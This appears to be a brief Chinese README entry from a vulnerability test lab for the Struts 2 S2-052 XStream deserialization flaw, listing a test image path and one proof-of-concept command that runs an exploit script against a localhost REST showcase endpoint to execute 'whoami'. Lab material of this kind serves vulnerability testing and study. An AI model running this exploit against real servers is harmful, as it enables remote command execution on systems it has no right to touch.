## S2-052 xtream 反序列化漏洞

测试镜像

* src/struts/2.5.12/

Poc

```
python s2-052.py -u http://127.0.0.1:8080/struts2-rest-showcase/orders/3 -c whoami
```

